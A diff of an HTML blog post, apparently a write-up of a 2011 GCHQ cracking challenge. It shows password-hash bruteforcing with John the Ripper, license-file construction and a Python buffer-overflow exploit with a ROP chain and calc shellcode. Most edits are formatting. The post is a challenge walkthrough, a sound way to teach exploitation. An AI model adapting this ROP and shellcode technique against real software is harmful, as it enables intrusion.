@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2011/12/03/gchq-challenge-part-3.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -378,12 +358,14 @@ I won’t do a detailed analysis of the ASM code.</p>
     <span class="p">}</span>
 
     <span class="k">return</span> <span class="n">server_connect</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">keys</span><span class="p">);</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>So basically, it search for a license.txt file with a specific file format which is as follow:</p>
 
 <figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre>gchq | password | dword 0 | dword 1 | dword 2</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre>gchq | password | dword 0 | dword 1 | dword 2
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>In the ASM code you have this:</p>
 
@@ -398,7 +380,8 @@ I won’t do a detailed analysis of the ASM code.</p>
 .text:00401128                 mov     [esp+78h+var_74], 0
 .text:00401130                 lea     eax, [ebp+buffer]
 .text:00401133                 mov     [esp+78h+var_78], eax
-.text:00401136                 call    memset</pre></td></tr></tbody></table></code></pre></figure>
+.text:00401136                 call    memset
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>We have the value 0x18 which is 24 in decimal ;).
 It basically mean that you have a 24 bytes buffer which receive “gchq”, the password and 3 dwords. From this we can deduce the password size: 24 - 4 - 12 = 8.</p>
@@ -416,19 +399,22 @@ It basically mean that you have a 24 bytes buffer which receive “gchq”, the 
 File = $JOHN/alpha.chr
 MinLen = 8
 MaxLen = 8
-CharCount = 26</pre></td></tr></tbody></table></code></pre></figure>
+CharCount = 26
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>We suppose the password is full alpha.</p>
 
 <p>Then we have to format our hash using the standard unix format:</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre>cyber:hqDTK7b8K2rvw:1:2:3:4:::</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre>cyber:hqDTK7b8K2rvw:1:2:3:4:::
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>We bruteforce it like this:</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="nv">$ </span>john <span class="nt">-i</span>:cyber <span class="nb">hash</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="nv">$ </span>john <span class="nt">-i</span>:cyber <span class="nb">hash</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>If you’ve got rainbow tables or the word in your wordlist then you are lucky not to bruteforce like i had to.</p>
 
@@ -441,7 +427,8 @@ CharCount = 26</pre></td></tr></tbody></table></code></pre></figure>
 </pre></td><td class="code"><pre><span class="nv">$ </span>john <span class="nt">-show</span> ./hash 
 cyber:cyberwin:1:2:3:4:::
 
-1 password <span class="nb">hash </span>cracked, 0 left</pre></td></tr></tbody></table></code></pre></figure>
+1 password <span class="nb">hash </span>cracked, 0 left
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>About the dwords … where do we get them?</p>
 
@@ -450,7 +437,8 @@ cyber:cyberwin:1:2:3:4:::
 <figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre>loading stage1 license key(s)...
-loading stage2 license key(s)...</pre></td></tr></tbody></table></code></pre></figure>
+loading stage2 license key(s)...
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>So the dwords are in the first and second challenges.
 Remember that there are some dwords that we don’t use.</p>
@@ -465,29 +453,33 @@ Remember that there are some dwords that we don’t use.</p>
 6
 7
 8
-</pre></td><td class="code"><pre><span class="n">main</span><span class="o">:</span>
-    <span class="k">jmp</span> <span class="n">short</span> <span class="n">begin</span>
+</pre></td><td class="code"><pre><span class="nl">main:</span>
+    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">begin</span>
 
-<span class="n">key0</span><span class="o">:</span> <span class="kt">dd</span> <span class="mh">0xa3bfc2af</span>
+<span class="nl">key0:</span> <span class="kd">dd</span> <span class="mh">0xa3bfc2af</span>
 
-<span class="c">; let's make some space for our buffer!</span>
-<span class="n">begin</span><span class="o">:</span>
-    <span class="k">sub</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x100</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="c1">; let's make some space for our buffer!</span>
+<span class="nl">begin:</span>
+    <span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0x100</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>In the second challenge:</p>
 
 <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="nx">firmware</span><span class="p">:</span> <span class="p">[</span><span class="mh">0xd2ab1f05</span><span class="p">,</span> <span class="mh">0xda13f110</span><span class="p">]</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="nx">firmware</span><span class="p">:</span> <span class="p">[</span><span class="mh">0xd2ab1f05</span><span class="p">,</span> <span class="mh">0xda13f110</span><span class="p">]</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Now ce can construct the license file using the following (don’t forget about little endian here if you are on x86 ;)):</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="nv">$ </span><span class="nb">printf</span> <span class="s2">"gchqcyberwin</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">a3</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">f1</span><span class="se">\x</span><span class="s2">13</span><span class="se">\x</span><span class="s2">da"</span> <span class="o">&gt;</span> license.txt</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="nv">$ </span><span class="nb">printf</span> <span class="s2">"gchqcyberwin</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">a3</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">f1</span><span class="se">\x</span><span class="s2">13</span><span class="se">\x</span><span class="s2">da"</span> <span class="o">&gt;</span> license.txt
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>You can either compile the reversed version or use the given executable:</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="nv">$ </span>gcc <span class="nt">-o</span> reversed reversed.c <span class="nt">-lcrypt</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="nv">$ </span>gcc <span class="nt">-o</span> reversed reversed.c <span class="nt">-lcrypt</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>You will get this output:</p>
 
@@ -542,17 +534,20 @@ Content-Length: 315
 &lt;META HTTP-EQUIV<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">Content</span><span class="o">=</span><span class="s2">"text/html; charset=us-ascii"</span><span class="o">&gt;</span>
 &lt;BODY&gt;&lt;h2&gt;Not Found&lt;/h2&gt;
 &lt;hr&gt;&lt;p&gt;HTTP Error 404. The requested resource is not found.
-&lt;/BODY&gt;&lt;/HTML&gt;</pre></td></tr></tbody></table></code></pre></figure>
+&lt;/BODY&gt;&lt;/HTML&gt;
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>If you look in your browser at the following address:</p>
 
 <figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre>http://www.canyoucrackit.co.uk/hqDTK7b8K2rvw/a3bfc2af/d2ab1f05/da13f110/key.txt</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre>http://www.canyoucrackit.co.uk/hqDTK7b8K2rvw/a3bfc2af/d2ab1f05/da13f110/key.txt
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>You will get the keyword:</p>
 
 <figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre>Pr0t3ct!on#cyber_security@12*12.2011+</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre>Pr0t3ct!on#cyber_security@12*12.2011+
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <h1 id="congratz">Congratz</h1>
 
@@ -587,7 +582,8 @@ Poor pay for rare skills and working for a government agency … not including t
 <p>If you reverse and read the code with care … you’d see that the fscanf() function is susceptible to an overflow ;).</p>
 
 <figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="n">fscanf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="n">fscanf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>If you read the manual:</p>
 
@@ -596,7 +592,8 @@ Poor pay for rare skills and working for a government agency … not including t
 3
 </pre></td><td class="code"><pre>s      Matches a sequence of non-white-space characters; the next pointer must be a pointer to character array that is long enough
               to hold the input sequence and the terminating null character ('\0'), which is added automatically.  The input string stops
-              at white space or at the maximum field width, whichever occurs first.</pre></td></tr></tbody></table></code></pre></figure>
+              at white space or at the maximum field width, whichever occurs first.
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Yep, it doesn’t end at ‘\0’ ;).
 It basically end reading when you end the file or the size specification or whitespaces: “\x20\x09\x0d\x0c\x0b\x0a”.</p>
@@ -745,53 +742,53 @@ There is a limit as of the size of the payload, around 700-800 bytes which cause
 </span>
 <span class="c1"># == stack related
 # pushad | retn
-</span><span class="n">pushad</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xbc\xce\x02\x61</span><span class="s">'</span>
+</span><span class="n">pushad</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\xbc\xce\x02\x61</span><span class="s">'</span>
 <span class="c1"># pop eax | retn
-</span><span class="n">pop_eax</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x94\xa4\x14\x61</span><span class="s">'</span>
+</span><span class="n">pop_eax</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x94\xa4\x14\x61</span><span class="s">'</span>
 <span class="c1"># pop ebx | retn
-</span><span class="n">pop_ebx</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xe9\x0e\x03\x61</span><span class="s">'</span>
+</span><span class="n">pop_ebx</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\xe9\x0e\x03\x61</span><span class="s">'</span>
 <span class="c1"># pop edi | retn
-</span><span class="n">pop_edi</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x67\x15\x11\x61</span><span class="s">'</span>
+</span><span class="n">pop_edi</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x67\x15\x11\x61</span><span class="s">'</span>
 <span class="c1"># pop esi | pop edi | pop ebp | retn
-</span><span class="n">pop_sdb</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xef\x8e\x06\x61</span><span class="s">'</span>
+</span><span class="n">pop_sdb</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\xef\x8e\x06\x61</span><span class="s">'</span>
 
 <span class="c1"># == memory patch
 # 0x6111459f :  # MOV DWORD PTR DS:[EAX],ESI # MOV EAX,EDI # POP EBX # POP ESI # POP EDI # POP EBP # RETN
-</span><span class="n">patch_at_eax</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x9f\x45\x11\x61</span><span class="s">'</span>
+</span><span class="n">patch_at_eax</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x9f\x45\x11\x61</span><span class="s">'</span>
 
 <span class="c1"># == stack pivots
 # add esp, 8 | retn
-</span><span class="n">add_esp8</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x4a\xb8\x02\x61</span><span class="s">'</span>
+</span><span class="n">add_esp8</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x4a\xb8\x02\x61</span><span class="s">'</span>
 
 <span class="c1"># == registry related
 # 0x6113f7e3 :  # MOV EDX,EAX # MOV EAX,EDX # RETN
-</span><span class="n">mov_da</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xe3\xf7\x13\x61</span><span class="s">'</span>
+</span><span class="n">mov_da</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\xe3\xf7\x13\x61</span><span class="s">'</span>
 <span class="c1"># 0x6113f7e5 :  # MOV EAX,EDX # RETN
-</span><span class="n">mov_ad</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xe5\xf7\x13\x61</span><span class="s">'</span>
+</span><span class="n">mov_ad</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\xe5\xf7\x13\x61</span><span class="s">'</span>
 <span class="c1"># xchg eax, ecx
-</span><span class="n">xchg_ac</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x7b\x6f\x09\x61</span><span class="s">'</span>
+</span><span class="n">xchg_ac</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x7b\x6f\x09\x61</span><span class="s">'</span>
 <span class="c1"># xchg eax, edx
-</span><span class="n">xchg_ad</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x5a\xf0\x09\x61</span><span class="s">'</span>
+</span><span class="n">xchg_ad</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x5a\xf0\x09\x61</span><span class="s">'</span>
 <span class="c1"># call eax
-</span><span class="n">jmp_eax</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x9b\x9d\x13\x61</span><span class="s">'</span> <span class="c1"># 0x61139d9b
+</span><span class="n">jmp_eax</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x9b\x9d\x13\x61</span><span class="s">'</span> <span class="c1"># 0x61139d9b
 </span>
 <span class="c1"># gadget(s) from executable
 # ret
-</span><span class="n">ret</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x86\x10\x40\x00</span><span class="s">'</span>
+</span><span class="n">ret</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x86\x10\x40\x00</span><span class="s">'</span>
 
 
 <span class="s">''' Exploit Section '''</span>
 
-<span class="n">junk1</span> <span class="o">=</span> <span class="n">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mi">44</span>
-<span class="n">hasLicense</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x01\x00\x00\x00</span><span class="s">'</span> <span class="c1"># hasLicense
-</span><span class="n">junk2</span> <span class="o">=</span> <span class="n">b</span><span class="s">'b'</span> <span class="o">*</span> <span class="mi">12</span>
+<span class="n">junk1</span> <span class="o">=</span> <span class="s">b'a'</span> <span class="o">*</span> <span class="mi">44</span>
+<span class="n">hasLicense</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x01\x00\x00\x00</span><span class="s">'</span> <span class="c1"># hasLicense
+</span><span class="n">junk2</span> <span class="o">=</span> <span class="s">b'b'</span> <span class="o">*</span> <span class="mi">12</span>
 <span class="c1"># pop | retn
-</span><span class="n">seip</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xa3\x14\x40\x00</span><span class="s">'</span>  <span class="c1"># eip
-</span><span class="n">sebp</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x00\x02\x40\x00</span><span class="s">'</span>  <span class="c1"># ebp
+</span><span class="n">seip</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\xa3\x14\x40\x00</span><span class="s">'</span>  <span class="c1"># eip
+</span><span class="n">sebp</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x00\x02\x40\x00</span><span class="s">'</span>  <span class="c1"># ebp
 </span>
 <span class="c1"># == rop chain: recover esp in eax
 # pop esi # junk # junk # retn
-</span><span class="n">prepare_regs</span> <span class="o">=</span> <span class="n">pop_sdb</span> <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">b</span><span class="s">'junk'</span> <span class="o">*</span> <span class="mi">2</span>
+</span><span class="n">prepare_regs</span> <span class="o">=</span> <span class="n">pop_sdb</span> <span class="o">+</span> <span class="s">b'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="s">b'junk'</span> <span class="o">*</span> <span class="mi">2</span>
 <span class="c1"># pop edi # pop ebp # retn
 </span><span class="n">prepare_regs</span> <span class="o">+=</span> <span class="n">pop_edi</span> <span class="o">+</span> <span class="n">pop_eax</span> <span class="o">+</span> <span class="n">pop_eax</span>
 <span class="c1"># pop ebx
@@ -846,30 +843,31 @@ esp = esp
 
 <span class="c1"># now our payload
 # our payload will be a calc here
-</span><span class="n">calc</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xda\xd5\xd9\x74\x24\xf4\x5b\xba\xf3\x21\x03\x70\x31\xc9</span><span class="s">'</span>      \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xb1\x33\x83\xeb\xfc\x31\x53\x13\x03\xa0\x32\xe1\x85\xba</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xdd\x6c\x65\x42\x1e\x0f\xef\xa7\x2f\x1d\x8b\xac\x02\x91</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xdf\xe0\xae\x5a\x8d\x10\x24\x2e\x1a\x17\x8d\x85\x7c\x16</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x0e\x28\x41\xf4\xcc\x2a\x3d\x06\x01\x8d\x7c\xc9\x54\xcc</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xb9\x37\x96\x9c\x12\x3c\x05\x31\x16\x00\x96\x30\xf8\x0f</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xa6\x4a\x7d\xcf\x53\xe1\x7c\x1f\xcb\x7e\x36\x87\x67\xd8</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xe7\xb6\xa4\x3a\xdb\xf1\xc1\x89\xaf\x00\x00\xc0\x50\x33</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x6c\x8f\x6e\xfc\x61\xd1\xb7\x3a\x9a\xa4\xc3\x39\x27\xbf</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x17\x40\xf3\x4a\x8a\xe2\x70\xec\x6e\x13\x54\x6b\xe4\x1f</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x11\xff\xa2\x03\xa4\x2c\xd9\x3f\x2d\xd3\x0e\xb6\x75\xf0</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x8a\x93\x2e\x99\x8b\x79\x80\xa6\xcc\x25\x7d\x03\x86\xc7</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x6a\x35\xc5\x8d\x6d\xb7\x73\xe8\x6e\xc7\x7b\x5a\x07\xf6</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\xf0\x35\x50\x07\xd3\x72\xae\x4d\x7e\xd2\x27\x08\xea\x67</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x2a\xab\xc0\xab\x53\x28\xe1\x53\xa0\x30\x80\x56\xec\xf6</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x78\x2a\x7d\x93\x7e\x99\x7e\xb6\x1c\x7c\xed\x5a\xcd\x1b</span><span class="s">'</span>   \
-        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x95\xf9\x11</span><span class="s">'</span><span class="p">;</span>
+</span><span class="n">calc</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\xda\xd5\xd9\x74\x24\xf4\x5b\xba\xf3\x21\x03\x70\x31\xc9</span><span class="s">'</span>      \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\xb1\x33\x83\xeb\xfc\x31\x53\x13\x03\xa0\x32\xe1\x85\xba</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\xdd\x6c\x65\x42\x1e\x0f\xef\xa7\x2f\x1d\x8b\xac\x02\x91</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\xdf\xe0\xae\x5a\x8d\x10\x24\x2e\x1a\x17\x8d\x85\x7c\x16</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\x0e\x28\x41\xf4\xcc\x2a\x3d\x06\x01\x8d\x7c\xc9\x54\xcc</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\xb9\x37\x96\x9c\x12\x3c\x05\x31\x16\x00\x96\x30\xf8\x0f</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\xa6\x4a\x7d\xcf\x53\xe1\x7c\x1f\xcb\x7e\x36\x87\x67\xd8</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\xe7\xb6\xa4\x3a\xdb\xf1\xc1\x89\xaf\x00\x00\xc0\x50\x33</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\x6c\x8f\x6e\xfc\x61\xd1\xb7\x3a\x9a\xa4\xc3\x39\x27\xbf</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\x17\x40\xf3\x4a\x8a\xe2\x70\xec\x6e\x13\x54\x6b\xe4\x1f</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\x11\xff\xa2\x03\xa4\x2c\xd9\x3f\x2d\xd3\x0e\xb6\x75\xf0</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\x8a\x93\x2e\x99\x8b\x79\x80\xa6\xcc\x25\x7d\x03\x86\xc7</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\x6a\x35\xc5\x8d\x6d\xb7\x73\xe8\x6e\xc7\x7b\x5a\x07\xf6</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\xf0\x35\x50\x07\xd3\x72\xae\x4d\x7e\xd2\x27\x08\xea\x67</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\x2a\xab\xc0\xab\x53\x28\xe1\x53\xa0\x30\x80\x56\xec\xf6</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\x78\x2a\x7d\x93\x7e\x99\x7e\xb6\x1c\x7c\xed\x5a\xcd\x1b</span><span class="s">'</span>   \
+        <span class="o">+</span> <span class="s">b'</span><span class="se">\x95\xf9\x11</span><span class="s">'</span><span class="p">;</span>
 
-<span class="n">egg</span> <span class="o">=</span> <span class="n">rop_chain</span> <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="n">calc</span>
+<span class="n">egg</span> <span class="o">=</span> <span class="n">rop_chain</span> <span class="o">+</span> <span class="s">b'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="n">calc</span>
 
 <span class="c1"># write our sploit file :)
 </span><span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"license.txt"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
-<span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">egg</span><span class="p">)</span>
-<span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="n">fp</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">egg</span><span class="p">)</span>
+<span class="n">fp</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>So as you can see this is a direct ret overwrite, it bypass the “hasLicense” but it fails to gethostbyname() because we overwrite the hostname ;).</p>
 
@@ -1011,6 +1009,26 @@ I might be wrong … but well I do not see any advantages.</li>
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
